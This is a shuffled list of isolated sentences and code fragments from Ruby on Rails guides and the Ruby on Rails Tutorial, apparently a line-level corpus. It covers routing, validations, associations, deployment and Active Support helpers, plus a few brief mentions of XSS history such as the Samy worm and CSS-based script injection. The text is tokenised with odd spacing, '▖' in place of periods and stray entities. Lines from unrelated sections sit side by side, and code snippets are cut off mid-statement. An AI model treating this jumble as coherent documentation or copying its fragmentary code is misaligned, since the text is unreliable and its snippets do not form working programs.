Rails also owes much of its success to its elegant and compact design ; by exploiting the malleability of the underlying \ href { http : / / ruby-lang ▖ org / } { Ruby } language , Rails effectively creates a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Domain _ Specific _ Language } { domain-specific language } for writing web applications ▖ As a result , many common web programming tasks---such as generating HTML , making data models , and routing URLs---are easy with Rails , and the resulting application code is concise and readable .
Parameters
Whether to include the explicit \ kode { self } is largely a matter of taste .
create test / fixtures / blorgh / comments ▖ yml
Hardly any email service or ISP does enforce case sensitive email addresses , returning messages whose recipient &apos;s email address was not typed correctly ( in all upper case , for example ) .
belongs _ to : manager , class _ name : &quot; Employee &quot;
git : init
Besides that , one can use `deep _ symbolize _ keys` and `deep _ symbolize _ keys ! ` to symbolize all the keys in the given hash and all the hashes nested into it ▖
This worm automatically sent a friend request to Samy ( the attacker ) simply by visiting his profile ▖
The resulting command to generate the Static Pages controller appears in Listing ~ \ ref { code : generating _ pages } .
If your application does need to handle custom images or other file uploads , I recommend \ href { https : / / github ▖ com / thoughtbot / paperclip } { Paperclip } or \ href { https : / / github ▖ com / jnicklas / carrierwave } { CarrierWave } .
some _ code
def article _ params
Usually , specifying the engine inside the Gemfile would be done by specifying it ╼ as a normal , everyday gem .
# # # Passing in arguments
$ bundle exec rake test : mailers
To add the new webserver , we simply follow the \ href { https : / / devcenter ▖ heroku ▖ com / articles / deploying-rails-applications-with-the-puma-web-server } { Heroku Puma documentation } .
To get them to pass , we need to use the validation argument to constrain length , which is just \ kode { length } , along with the \ kode { maximum } parameter to enforce the upper bound ( Listing ~ \ ref { code : length _ validation } ) .
Finally , the author &apos;s name should be displayed on the article &apos;s page ▖
As a response to that security issue ╼ ( &#91; CVE-2012-2660 &#93; ( https : / / groups ▖ google ▖ com / forum / # ! searchin / rubyonrails-security / deep _ munge / rubyonrails-security / 8SA-M3as7A8 / Mr9fi9X4kNgJ ) , ╼ &#91; CVE-2012-2694 &#93; ( https : / / groups ▖ google ▖ com / forum / # ! searchin / rubyonrails-security / deep _ munge / rubyonrails-security / jILZ34tAHF4 / 7x0hLH-o0-IJ ) ╼ and &#91; CVE-2013-0155 &#93; ( https : / / groups ▖ google ▖ com / forum / # ! searchin / rubyonrails-security / CVE-2012-2660 / rubyonrails-security / c7jT-EeN9eI / L0u4e87zYGMJ ) ) ╼ `deep _ munge` method was introduced as a solution to keep Rails secure by default .
Twitter supports direct ( private ) messaging by prefixing a micropost with the letter ~ ``d &apos; &apos; .
trashable ▖ cleanup ( depth )
Cucumber features start with a short description of the feature , as follows :
If you re-submit the form one more time you &apos;ll now no longer get the missing ╼ template error ▖
mod _ name = path ▖ deconstantize
Before your email reaches your Rails app , you would have had to ╼ configure your system to somehow forward emails to your app , which needs to be ╼ listening for that ▖
&quot; alice in wonderland &quot; ▖ titleize # = &gt; &quot; Alice In Wonderland &quot;
With this declaration , all of the views rendered by the `ProductsController` will use `app / views / layouts / inventory ▖ html ▖ erb` as their layout .
Our plan in the case of following / followers pages is to check the number is correctly displayed and that links with the right URLs appear on the page .
For example , the `admin ▖ css` ╼ and `admin ▖ js` manifest could contain the JS and CSS files that are used for the ╼ admin section of an application .
constraints : lambda { &#124; request &#124; Blacklist ▖ retrieve _ ips ▖ include ? (
also shows an alternate use of the \ kode { if } keyword : Ruby allows you to write a statement that is evaluated only if the statement following \ kode { if } is true .
Recall from Section ~ \ ref { sec : deleting _ users } that site administrators have the power to \ emph { destroy } users .
# = &gt; 100 ▖ 000 %
Rails provides a very simple HTTP authentication system that will work nicely in ╼ this situation .
I also recommend deploying the application to Heroku :
The ╼ precompiled copies are then served as static assets by the web server ▖
&lt; % = yield : special _ script % &gt;
For example , in this chapter we &apos;ll update the site header with login / logout links and a profile link .
The question mark in
Second , before we wrote
resources : books
Dynamically generating a secret token .
in the toy app ( Listing ~ \ ref { code : rails _ routes _ root _ route } ) , and the code
Now that the engine can create new articles , it only makes sense to add ╼ commenting functionality as well ▖
Add your public key to Bitbucket by clicking on the avatar image in the upper right and selecting ``Manage account &apos; &apos; and then ``SSH keys &apos; &apos; ( Figure ~ \ ref { fig : add _ public _ key } ) .
1235551234 ▖ to _ s ( : phone , country _ code : 1 )
Note also that Listing ~ \ ref { code : account _ activation _ edit _ action } handles the case of an invalid activation token ; this should rarely happen , but it &apos;s easy enough to redirect in this case to the root URL .
The result of the CSS in Listing ~ \ ref { code : logo _ css } is shown in Figure ~ \ ref { fig : sample _ app _ logo } .
When making Date comparisons using methods which honor the user time zone , make sure to use `Date ▖ current` and not `Date ▖ today` ▖
For example , this view would work with the layout that you just saw :
For example , \ kode { : name } is a symbol .
The final key , ` : handlers` , is telling ╼ us what _ template handlers _ could be used to render our template ▖ ` : erb` is most ╼ commonly used for HTML templates , ` : builder` is used for XML templates , and ╼ ` : coffee` uses CoffeeScript to build JavaScript templates .
Date ▖ new ( 2000 , 3 , 31 ) ▖ prev _ month # = &gt; Tue , 29 Feb 2000
# order dependency and want to debug it , you can fix the order by providing
Recall from Section ~ \ ref { sec : profile _ micropost _ tests } that we can use code like
* Each comment belongs to one article .
Reports the approximate distance in time between two Time or Date objects or integers as seconds ▖
* Rails 4 ▖ 0 has deprecated `ActionController : : Base ▖ page _ cache _ extension` option ▖
Several classes in Rails overwrite this method .
in Listing ~ \ ref { code : log _ in _ success } .
At this point , you should merge the topic branch into master :
Defaults to ` &apos; signed cookie &apos; ` .
which ( as described in the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 1 ▖ 5 / classes / ActiveModel / Validations / HelperMethods ▖ html # method-i-validates _ confirmation _ of } { Rails API } ) automagically creates an attribute called \ kode { password \ _ confirmation } .
has _ many : deliveries , - &gt; { extending FindRecentExtension }
Meanwhile , the CSS in the rule
Never ever put your arguments directly inside the conditions string .
This causes Rails to look for a partial with the corresponding name in the views directory of the given resource :
&gt; &gt; Rails ▖ env ▖ test ?
This works exactly the same as :
With that configuration you get a user &apos;s name via their profile , `user ▖ profile ▖ name` , but it could be handy to still be able to access such attribute directly :
in Listing ~ \ ref { code : stub _ user _ view } .
Like the \ kode { user \ _ id } , the \ kode { content } attribute must be present , and it is further constrained to be no longer than 140 characters , making it an honest \ emph { micro } post .
The files in this directory can be used to hold configuration settings that should be made after all of the frameworks are loaded .
For example :
The idea is that if ╼ you configure your applications in the very same way most of the time then this ╼ should be the default way ▖
* `config ▖ dependency _ loading` is a flag that allows you to disable constant autoloading setting it to false ▖
create README ▖ rdoc
Congratulations , you can now create , show , list , update and destroy ╼ articles .
&quot; dude &quot; ▖ pluralize ( 1 ) # = &gt; &quot; dude &quot;
# # # # `bin` Directory
If the action is being used in a public API and you can &apos;t change to HTTP method ╼ being used , you can update your form to use the `PUT` method instead :
It also defines `DateTime ▖ yesterday` and `DateTime ▖ tomorrow` , and the instance predicates `past ? ` , and `future ? ` relative to `DateTime ▖ current` .
For the sake of readers who skip this section , the rest of this tutorial will err on the side of caution and explicitly use \ kode { bundle exec } , but of course you should feel free to use the more compact version if your system is properly configured .
Our first step is to add a delete link to the micropost partial as in Listing ~ \ ref { code : feed _ item _ partial } .
get &apos; * a / foo / * b &apos; , to : &apos; test # index&apos;
We can interact with users as a \ emph { resource } through a standard set of REST URLs .
# Should return an ActiveRecord : : Relation .
This procedure may seem pedantic for such a simple test , but I have seen many ``simple &apos; &apos; tests that actually test the wrong thing ; being meticulous about TDD is simply the \ emph { only } way to be confident that we &apos;re testing the right thing .
As shown in the example , you can also combine standard validations with your ╼ own custom validators .
Note that , now that there are two lines that need to be run when the user is logged in , Listing ~ \ ref { code : feed _ instance _ variable } changes
Copyright ( c ) 2013 Michael Hartl
The \ kode { config } directory is where Rails collects files needed for the application configuration ( hence the name ) .
Active Record associations let you easily declare the relationship between two ╼ models ▖
This uses the \ kode { escape \ _ javascript } method , which is needed to escape out the result when inserting HTML in a JavaScript file .
If you assign multiple objects in one statement , then they are all saved .
The \ kode { have \ _ selector } method checks for a particular selector element ( i ▖ e ▖ , an HTML tag , though as of Capybara ~ 2 ▖ 0 it only works for \ emph { visible } elements ) .
$ ( document ) ▖ on &quot; page : change &quot; , - &gt;
This view uses Embedded Ruby to display the user &apos;s name and email address , assuming the existence of an instance variable called \ kode { @ user } .
To create one , use the `create _ ` prefix .
# # # Minimum
# # # `errors ▖ clear`
n &gt; ╼ \ end { enumerate } ╼ ╼ \ subsection { Length validation } % ( fold ) ╼ \ label { sec : length _ validation } ╼ ╼
( The second factor is ameliorated when using Guard as suggested in Section ~ \ ref { sec : guard } ▖ )
Ruby on Rails is not &quot; someone else &apos;s framework ▖ &quot;
That &apos;s a little bit better , but what about multiple links that have the same ╼ effect ?
This is because RSpec uses the general malleability of Ruby to define a \ emph { domain-specific language } ( DSL ) built just for testing .
&#124; &#124; 422 &#124; : unprocessable _ entity &#124;
Returns a set of select tags ( one for hour , minute and optionally second ) pre-selected for accessing a specified time-based attribute ▖
# # # # text _ area
Defining an optional \ kode { : size } parameter for the \ kode { gravatar \ _ for } helper .
Initializers defined using the `initializer` method will be run in the order they are defined in , with the exception of ones that use the ` : before` or ` : after` methods .
Dynamically Generated Methods
As a result , the only way to test the proper authorization for the \ kode { update } action itself is to issue a direct request ▖ (
# # # # # ` : polymorphic`
The ` : source` option specifies the source association name for a `has _ many : through` association ▖
ActionController : : Helpers ▖ helpers _ path = app ▖ helpers _ paths
The `take` method retrieves a record without any implicit ordering ▖
duplicate = array ▖ dup
The result is shown in Figure ~ \ ref { fig : blank _ signup _ password _ digest } .
.
TIP : For content that is shared among all pages in your application , you can use partials directly from layouts .
Files in these directories are ( even post-3 ▖ 0 ) automatically served up via requests to http : / / www ▖ example ▖ com / stylesheets , etc .
In April 2008 more than 510,000 sites were hacked like this , among them the British government , United Nations , and many more high targets .
X : : Y : : Z ▖ parent # = &gt; X : : Y
&#91; &#93; ▖ to _ formatted _ s ( : db ) # = &gt; &quot; null &quot;
Active Record lets you specify in advance all the associations that are going to be loaded ▖
Click on ``Go to your Dashboard &apos; &apos;
Both of these views are just placeholders : they have a top-level heading ( inside the \ kode { h1 } tag ) and a paragraph ( \ kode { p } tag ) with the full path to the relevant file .
The final tests for the status feed .
A partial for displaying form submission error messages .
Setting the root route .
under MySQL .
mail ( to : user ▖ email , ▖ ▖ ▖ )
Application tests
In regular views you can access images in the `public / assets / images` directory ╼ like this :
% w ( 1 2 3 4 5 6 7 ) ▖ in _ groups ( 3 , &quot; 0 &quot; )
Note that Listing ~ \ ref { code : friendly _ forwarding _ code } is careful to remove the forwarding URL ; otherwise , subsequent login attempts would forward to the protected page until the user closed their browser .
So they mark it as ` : nodoc : ` and it &apos;s removed from public documentation ▖
* Pessimistic Locking
# # # # number _ to _ human _ size
There &apos;s quite a bit going on here , so let &apos;s take it step by step .
render &quot; books / edit &quot;
# config ▖ mock _ with : mocha
A recap of the initial User pages spec .
Unlike the contents of \ kode { flash } , the contents of \ kode { flash ▖ now } disappear as soon as there is an additional request , which is exactly the behavior we &apos;ve tested in Listing ~ \ ref { code : flash _ persistence _ test } .
use ActionDispatch : : Callbacks
Shorter version of `config ▖ action _ controller ▖ asset _ host` .
class Address &lt; ActiveRecord : : Base
# = &gt; &quot; BETWEEN &apos; 2009-10-25 &apos; AND &apos; 2009-10-26 &apos; &quot;
Using HTML5 , we can define a site layout with logo , header , footer , and main body content .
def qualified _ const _ set ( path , value )
( As usual with partials , you will have to create the file by hand using your text editor ▖ )
{ a : { b : 1 } } ▖ deep _ merge ( a : { c : 2 } )
&#91; ▖ ▖ ▖ &#93;
WARNING ▖ Note in the previous example only one key was symbolized .
The \ kode { update \ _ attributes } method accepts a hash of attributes , and on success performs both the update and the save in one step ( returning \ kode { true } to indicate that the save went through ) .
Write simple , declarative sentences ▖
Because the data model has changed through the addition of the \ kode { microposts } table , you will also need to migrate the production database :
As in Section ~ \ ref { sec : planning _ the _ application } , our next step is to use a text editor to update the \ kode { Gemfile } with the gems needed by our application .
GitHub has a variety of paid plans , but for open-source code their services are free , so sign up for a \ href { https : / / github ▖ com / signup / free } { free GitHub account } if you don &apos;t have one already .
beginning _ of _ week ( at _ beginning _ of _ week )
Virtually all Rails applications start the same way , by running \ kode { rails new } command .
class UsersController &lt; ApplicationController
def assign _ route _ options ( segments , defaults , requirements )
( As with \ kode { new } , \ kode { build } returns an object in memory but doesn &apos;t modify the database ▖ )
* `poster : &quot; image _ name ▖ png &quot; ` , provides an image to put in place of the video before it starts playing .
▖ ▖ .
# uses the cached copy of orders
Although the micropost form is actually now working , users can &apos;t immediately see the results of a successful submission because the current Home page doesn &apos;t display any microposts .
The \ kode { following } and \ kode { followers } actions .
Update Listing ~ \ ref { code : toy _ user _ presence _ valications } by replacing \ kode { FILL \ _ IN } with the appropriate code to validate the presence of name and email attributes in the User model ( Figure ~ \ ref { fig : user _ presence _ validations } ) .
We &apos;ll start in the header partial , \ kode { \ _ header ▖ html ▖ erb } ( Listing ~ \ ref { code : header _ partial _ links } ) , which has links to the Home and Help pages .
&lt; / li &gt;
array &#91; 1 &#93; &#91; 2 &#93; = = nil # = &gt; true
The second half of the association , \ kode { has \ _ many : microposts } , needs to be added by hand , as shown in ( Listing ~ \ ref { code : user _ has _ many _ microposts } ) .
Does not work in combination with the ` : polymorphic` options .
in Listing ~ \ ref { code : user _ show _ action } finds the user with id ~ \ texttt { 1 } .
The second way is using a block :
The implementation of micropost creation is similar ; the main difference is that , rather than using a separate page at / microposts / new , we will put the form on the Home page itself ( i ▖ e ▖ , the root path ~ / ) , as mocked up in Figure ~ \ ref { fig : home _ page _ with _ micropost _ form _ mockup } .
╼ $ ps aux
Or it could use CSS and / or JavaScript to hide a legitimate link in the web application , and display another one at its place which redirects to a fake web site .
If you need to do this then use a constraint on : controller that matches the namespace you require ▖ e ▖ g :
As you might guess , jQuery , like CSS , uses a dot ~ \ kode { ▖ } \ to manipulate CSS classes .
This makes it easy to tag log lines with debug information like subdomain and request id - both very helpful in debugging multi-user production applications .
Next , we need a unique activation token to activate users .
The resulting page is exactly the same as before , only now the variable part of the title is generated dynamically by ERb .
That said , a surprising number of beginners have used the \ emph { Ruby on Rails Tutorial } to learn web development from scratch , so even if you have limited experience I suggest giving it a try .
1 example , 0 failures , 1 pending
TIP : By default , dynamic segments don &apos;t accept dots - this is because the dot is used as a separator for formatted routes ▖
def show
And finally , if you want to have all Active Support available just issue :
The User model with an added \ kode { admin } boolean attribute .
to create the valid password digest for the test user .
As seen at the end of Listing ~ \ ref { code : rails _ command } , running \ kode { rails new } automatically runs the \ kode { bundle install } command after the file creation is done .
The &#91; moz-binding &#93; ( http : / / www ▖ securiteam ▖ com / securitynews / 5LP051FHPE ▖ html ) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers ( Firefox , for example ) .
This setting is ignored unless `config ▖ active _ record ▖ schema _ format = = : ruby` .
The current state of the signup page \ href { http : / / localhost : 3000 / signup } { / signup } .
Everything except for the `form _ for` declaration remained the same ▖ ╼
&lt; % = form _ for ( @ user , remote : true ) do &#124; f &#124; % &gt;
Pagination and object counts can both be performed through associations , leading to automatically efficient code .
This will connect to the database named `blog _ development` using the `postgresql` adapter ▖
* he or she ▖ ▖ ▖ use they .
The purpose of this book is to teach you how to develop custom web applications , and our tool of choice is the popular \ href { http : / / rubyonrails ▖ org } { Ruby on Rails } web framework .
git add : &quot; ▖ &quot;
# This code will be run each time you run your specs .
Loading development environment
# # # # Configuring a PostgreSQL Database
For our Blorgh ╼ engine this would be done by changing ╼ `app / controllers / blorgh / application _ controller ▖ rb` to look like :
Verify that \ kode { current \ _ user } is equal to the given user .
Performing Custom Validations
Note that Listing ~ \ ref { code : action _ tests _ admin } also makes sure that the user count doesn &apos;t change using the \ kode { assert \ _ no \ _ difference } method ( seen before in Listing ~ \ ref { code : a _ test _ for _ invalid _ submission } ) .
end _ of _ year ( at _ end _ of _ year )
Showing the given user &apos;s followers .
Then commit the changes and push up to Heroku :
Mailers are structured much like controller actions , with email templates defined as views .
d = Date ▖ new ( 2012 , 9 , 10 ) # = &gt; Mon , 10 Sep 2012
Not coincidentally , we already have exactly the methods we need : the \ kode { User ▖ find \ _ by } method provided by Active Record ( Section ~ \ ref { sec : finding _ user _ objects } ) and the \ kode { authenticate } method provided by \ kode { has \ _ secure \ _ password } ( Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } ) .
For simplicity , all command line examples use a Unix-style command line prompt ( a dollar sign ) , as follows :
This is not a cause for concern , as Ruby ignores extra newlines .
~ / ▖ irbrc
&lt; % = f ▖ text _ area : body % &gt; &lt; br &gt;
To avoid the ( huge ) full installation , I recommend the much smaller \ href { https : / / developer ▖ apple ▖ com / downloads / } { Command Line Tools for Xcode }
&quot; foo \ n \ t \ tbar &quot; ▖ indent ( 2 ) # = &gt; &quot; \ t \ tfoo \ n \ t \ t \ t \ tbar &quot;
The second step is then to use an \ kode { authenticate } method to verify that the user has the given password .
# # # # `to _ date` , `to _ time` , `to _ datetime`
If the cached data refers to a constant that is unknown at that point , the autoloading mechanism is triggered and if it succeeds the deserialization is retried transparently .
To include `http : / / example ▖ com / main ▖ css` :
As a result , the one line
By testing the relevant value of the \ kode { params } hash , we can now remember or forget the user based on the value of the submission
If you &apos;re comfortable using an IDE , I suggest taking a look at the options mentioned to see what fits with the way you work .
In particular , because hashes return \ kode { nil } for nonexistent keys , code like
╼ &gt; &gt; @ user = @ user &#124; &#124; &quot; the user &quot;
As with the logout test in Listing ~ \ ref { code : user _ logout _ test } , we &apos;ll use \ kode { delete } to issue a \ texttt { DELETE } request directly to the \ kode { destroy } action .
It will also create the `preview _ photo _ url` and `preview _ photo _ path` helpers .
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Named Helper &#124;
t ▖ datetime : appointment _ date
as seen in Listing ~ \ ref { code : user _ model _ password _ reset _ expired } .
&#124; ` { &quot; person &quot; : &#91; &#93; } ` &#124; ` { : person = &gt; nil } ` &#124;
* As this is a standard call to `image _ tag` you can pass in an options hash ╼ after the attachment URL as you could for any other image :
Content-Type : text / html
In case you &apos;ve previously installed a version of a gem ( such as Rails itself ) other than the one specified by the \ kode { Gemfile } , it &apos;s a good idea to \ emph { update } the gems with \ kode { bundle update } to make sure the versions match :
Article ▖ where ( author : author )
adapter : jdbcmysql
Use the idioms recommended in edge ▖
# first element was not duplicated , it will be changed in both arrays
Heroku recommends against using different databases in development and production , but for the sample application it won &apos;t make any difference , and SQLite is \ emph { much } easier than PostgreSQL to install and configure locally
If you didn &apos;t do that exercise , update your Users helper file with the contents of Listing ~ \ ref { code : gravatar _ option _ redux } before proceeding .
hash = { a : 1 , b : 2 } ▖ with _ indifferent _ access
get : index
# # # # Adding Member Routes
The eval ( ) function is a nightmare for blacklist input filters , as it allows the style attribute to hide the word &quot; innerHTML &quot; :
The User model for the toy application .
On Unix systems , some commands should be executed with \ kode { sudo } , which stands for ``substitute user do &apos; &apos;
The result appears in Listing ~ \ ref { code : remember _ token _ should _ not _ be _ blank }
Most associations with standard names will be supported ▖
# # # Walkthrough to Generating a Mailer
Now that we &apos;ve replaced the variable part of the page titles with ERb , each of our pages looks something like this :
# # # # select _ date
With this declaration , all of the views in the entire application will use `app / views / layouts / main ▖ html ▖ erb` for their layout .
# Returns the user corresponding to the remember token cookie .
to read
gem &apos; mysql2&apos;
\ href { http : / / peepcode ▖ com / } { PeepCode } and \ href { http : / / codeschool ▖ com / } { Code School } : The screencasts at PeepCode and interactive courses at Code School are consistently high-quality , and I warmly recommend them .
Meanwhile , the second line of \ kode { remember } uses the \ kode { update \ _ attribute } method to update the remember digest ▖ (
Rails also adapts rapidly to new developments in web technology and framework design .
# # # Understanding `yield`
index
member do
In addition , sometimes the test database gets corrupted and needs to be reset .
use \ kode { let } a second time , and also use the \ kode { specify } method .
`params` will be ` { controller : &apos; photos &apos; , action : &apos; show &apos; , id : &apos; 1&apos; , user _ id : &apos; 2&apos; } ` .
This is why the code
$ git fetch rails
stylesheet _ link _ tag : all
scope shallow _ prefix : &quot; sekret &quot; do
# # # # strip _ links ( html )
The sample app with nicely styled logo ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / sample _ app _ logo _ 4 _ 0-full ▖ png } { ( full size ) }
----------------------
class A
Using a digest for password resets is thus essential .
This makes it possible to pass live ╼ Active Record objects to your job instead of class / id pairs , which you then have ╼ to manually deserialize ▖
# # # # Linking to Images with the `image _ tag`
Finally , we &apos;ll add a custom stub view for the signup page ( Listing ~ \ ref { code : initial _ signup _ page } ) .
( If you have RVM installed , you should run
```apache
See &quot; Following users &quot; for the full implementation .
Since `adapter` is duplicate , the `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` connection information wins .
When you assign an object to a `has _ many` association , that object is automatically saved ( in order to update its foreign key ) ▖
$ git push heroku
dup &#91; : b &#93; &#91; : d &#93; &lt; &lt; 5
Like all of the other components of an engine , the assets should be namespaced ▖ ╼
( If you &apos;d like to see how \ kode { has \ _ secure \ _ password } is implemented , I suggest taking a look at \ href { https : / / github ▖ com / rails / rails / blob / master / activemodel / lib / active _ model / secure _ password ▖ rb } { the source code for \ texttt { secure \ _ password ▖ rb } } , which is well-documented and quite readable .
You can also help out by examining pull requests that have been submitted to Ruby on Rails via GitHub ▖
These are \ emph { system } setups , meaning you only have to do them once per computer :
# # # Using the `content _ for` Method
The User model returns the list of users to the controller .
The secure password source code has a line for this as well :
We can get started by generating a template test , which we &apos;ll call \ kode { site \ _ layout } :
first ▖ last @ foo ▖ jp
and got the result shown in Figure ~ \ ref { fig : activated _ user } .
* `ActiveSupport : : Logger ▖ silencer` is set to `false` to disable the ability to silence logging in a block ▖
&quot; Product &quot; ▖ demodulize # = &gt; &quot; Product &quot;
This will find all clients created yesterday by using a `BETWEEN` SQL statement :
# # # # Configuring an SQLite3 Database for JRuby Platform
Note from Table ~ \ ref { table : RESTful _ users } that the proper URL for a user &apos;s edit page is / users / 1 / edit ( assuming the user &apos;s id is ~ \ texttt { 1 } ) .
Adding a factory for administrative users .
# # # Sanity Check
We need to make two changes before the form in Listing ~ \ ref { code : micropost _ form } will work .
= &gt; 1
By the way , if you have deployed your sample app to Heroku , you can see its environment using the \ texttt { heroku } command , which provides its own ( remote ) console :
a2 ▖ x # = &gt; 2 , overridden in a2
The &#91; `TagAssertions` module &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionDispatch / Assertions / TagAssertions ▖ html ) ( containing methods such as `assert _ tag` ) , &#91; has been deprecated &#93; ( https : / / github ▖ com / rails / rails / blob / 6061472b8c310158a2a2e8e9a6b81a1aef6b60fe / actionpack / lib / action _ dispatch / testing / assertions / dom ▖ rb ) in favor of the `assert _ select` methods from the `SelectorAssertions` module , which has been extracted into the &#91; rails-dom-testing gem &#93; ( https : / / github ▖ com / rails / rails-dom-testing ) .
This is an indication that the \ kode { rdoc } format isn &apos;t common enough for Bitbucket to support it automatically , and indeed I and virtually every other developer I know prefer to use \ emph { Markdown } instead .
&#91; Proc ▖ new { &#124; filename , path &#124; path = ~ / app \ / assets / &amp; &amp; !
Let &apos;s start by defining a minimalist \ kode { create } action for the Sessions controller , along with empty \ kode { new } and \ kode { destroy } actions ( Listing ~ \ ref { code : initial _ create _ session } ) .
Doing so can lead to orphaned records in your database .
To become a Rails \ emph { expert } , you need to understand Ruby more deeply , and this book gives you a good foundation for developing that expertise .
in Listing ~ \ ref { code : real _ account _ activation _ test } .
The \ kode { has \ _ many } method takes several optional arguments , including the object class name and the foreign key .
( We &apos;ll see many others in the chapters ahead ▖ )
If there was no `where` condition , this would generate the normal set of two queries .
create app / assets / javascripts / application ▖ js
belongs _ to : physician
If you &apos;ve followed the steps in Section ~ \ ref { sec : repository _ host } , you might notice that Bitbucket didn &apos;t automatically detect the \ kode { README ▖ rdoc } file from our repository , instead complaining on the main repository page that there is no README present ( Figure ~ \ ref { fig : bitbucket _ no _ readme } ) .
* `active _ support ▖ initialize _ beginning _ of _ week` Sets the default beginning of week for the application based on `config ▖ beginning _ of _ week` setting , which defaults to ` : monday` .
Of course , we could just edit the migration file for the \ kode { users } table in Listing ~ \ ref { code : users _ migration } , but that would require rolling back and then migrating back up .
# # # Using a String with ` : if` and ` : unless`
* `config ▖ assets ▖ precompile` allows you to specify additional assets ( other than `application ▖ css` and `application ▖ js` ) which are to be precompiled when `rake assets : precompile` is run .
This directory contains one file , `bin / rails` , which enables you to use the ╼ `rails` sub-commands and generators just like you would within an application ▖ ╼
A second option is to use \ kode { form \ _ tag } in place of \ kode { form \ _ for } , which might be even more idiomatically correct Rails , but it has less in common with the signup form , and at this stage I want to emphasize the parallel structure .
# Replace ActionDispatch : : ShowExceptions with Lifo : : ShowExceptions
Hashes are essentially arrays that aren &apos;t limited to integer indices .
Note that Listing ~ \ ref { code : user _ activation _ methods } eliminates the use of \ kode { user ▖ } , which would break inside the User model because there is no such variable :
As with the `welcome` controller , we will need to add a route so that Rails ╼ knows where we would like to navigate to see `comments` ▖
We &apos;ll start , as usual , with our tests .
Choose these in certain , specific cases ▖
config ▖ action _ dispatch ▖ default _ headers ▖ clear
This worked because , in the context of the Users controller , \ kode { will \ _ paginate } \ emph { assumes } the existence of an instance variable called \ kode { @ users } ( which , as we saw in Section ~ \ ref { sec : pagination } , should be of class \ kode { ActiveRecord : : Relation } ) .
Active Record provides the ` : inverse _ of` option so that you can inform it of these relations :
so its output is ready to be used in a query string .
# # # # Durations
This migration can be simplified by using the `t ▖ references` form :
get &apos; photos / : id &apos; , to : &apos; photos # show&apos;
update user with id \ kode { 1 }
&lt; option value = &quot; 1 &quot; &gt; Egypt &lt; / option &gt;
contains a \ emph { default } argument , which in this case is the empty string .
For instance :
The user \ kode { update } action ▖
To check your Rails installation , run the following command to print out the version number :
The method `present ? ` is equivalent to ` ! blank ? ` ▖
And the following in your routes file :
# # # Live Compilation
The method `parameterize` normalizes its receiver in a way that can be used in pretty URLs .
It is beyond the scope of this guide to inform you on how to secure your application code and environments ▖
The controller code needed to get these tests to pass is remarkably concise : we just retrieve the user followed or to be followed , and then follow or unfollow the user using the relevant utility method .
To make some actual microposts , we enter information at the new microposts page , \ href { http : / / localhost : 3000 / microposts / new } { / microposts / new } , as seen in Figure ~ \ ref { fig : demo _ new _ micropost _ rails _ 3 } .
The reason is not Factory Girl &apos;s fault , and in fact it is a \ emph { feature } , not a bug .
A method called on an instance , such as \ kode { length } , is called an \ emph { instance method } .
With this change , you can access an instance of the ` @ products` collection as the `item` local variable within the partial .
Default Headers
If you submit the form again now , Rails will complain about not finding the ╼ `show` action ▖
Here both the directory name and filename are important .
# # # # # ` : as`
See the RailsCast on `` \ href { http : / / railscasts ▖ com / episodes / 77-destroy-without-javascript } { Destroy Without JavaScript } &apos; &apos; for details .
At this point , our application---with an important caveat---enforces email uniqueness , and our test suite should pass :
Using the `new` method , an object can be instantiated without being saved :
Unfortunately , this orders the results in \ emph { ascending } order from smallest to biggest , which means that the oldest microposts come out first .
# # # # # `DateTime ▖ current`
The problem here is that we are missing an underlying abstraction .
To see what these parameters ╼ look like , change the `create` action to this :
User ▖ find _ each ( batch _ size : 5000 ) do &#124; user &#124;
We then redirect to the root URL with an informative flash message .
The \ href { http : / / gravatar ▖ com / } { Gravatar } image-cropping interface , with a picture of \ href { http : / / www ▖ michaelhartl ▖ com / } { some dude } .
Your scope can take arguments :
A failing test for validation of the \ kode { name } attribute .
Now let &apos;s add some links to ╼ navigate through pages .
Actually \ emph { doing } the scaling is beyond the scope of just Rails , but rest assured that if \ emph { your } application ever needs to handle the load of Hulu or the Yellow Pages , Rails won &apos;t stop you from taking over the world .
Revisiting strong parameters
# do something with the exception
The above code executes 1 ( to find 10 clients ) + 10 ( one per each client to load the address ) = * * 11 * * queries in total .
It also differs somewhat from the usual material covered in an introduction to Ruby .
Previous versions of Rails used a method called \ kode { attr \ _ accessible } in the \ emph { model } layer to solve this problem , and you may still see that method in legacy Rails applications , but as of Rails ~ 4 ▖ 0 the preferred technique is to use so-called \ emph { strong parameters } in the controller layer .
{ id : 89 , name : &quot; John Smith &quot; } ▖ to _ query ( &apos; user &apos; )
Formats a number as a percentage string .
get &apos; two &apos; = &gt; &apos; test # example &apos; , as : : example
By wrapping HTTP requests and responses in the simplest way possible , it unifies and distills the API for web servers , web frameworks , and software in between ( the so-called middleware ) into a single method call .
Then push up to the remote repository and deploy to Heroku :
* compiled file , but it &apos;s generally better to create a new file per style
The names are returned as symbols .
# # # Hash Conditions
Sign up for an \ href { http : / / aws ▖ amazon ▖ com / } { Amazon Web Services } account .
If these steps seem mysterious , take heart : I &apos;m just following the instructions from the \ href { https : / / github ▖ com / twbs / bootstrap-sass } { bootstrap-sass README file } .
Hi , Mr ▖ &lt; % puts &quot; Frodo &quot; % &gt;
The Rails routes , with a new rule for Microposts resources .
This is the middleware which supports the PUT and DELETE HTTP method types .
Consider asking someone from the core team or author of the code before removing it ▖
Because of the heavy lifting ahead , it &apos;s especially important to review where we &apos;re going .
Previously it raised `ActiveRecord : : AssociationTypeMismatch` for such arguments ▖
We can accomplish this as follows :
as shown in Listing ~ \ ref { code : close _ route } .
1234567890 ▖ to _ s ( : human ) # = &gt; &quot; 1 ▖ 23 Billion &quot;
We &apos;ll start by visiting the signup path using \ kode { get } :
Because the application code was already working , this test should be \ linebreak \ passing :
\ label { cha : rails _ flavored _ ruby }
NOTE : The actual action names aren &apos;t changed by this option ▖
If you encounter such an issue , ensure that you &apos;re not attempting to call the ╼ application &apos;s routing methods without the `main _ app` prefix from within the ╼ engine .
Routes for static pages .
If `config ▖ cache _ classes` is true , this option is ignored .
&#124; &#124; 306 &#124; : reserved &#124;
In the case of web applications , the ``domain logic &apos; &apos; typically consists of data models for things like users , articles , and products , and the GUI is just a web page in a web browser .
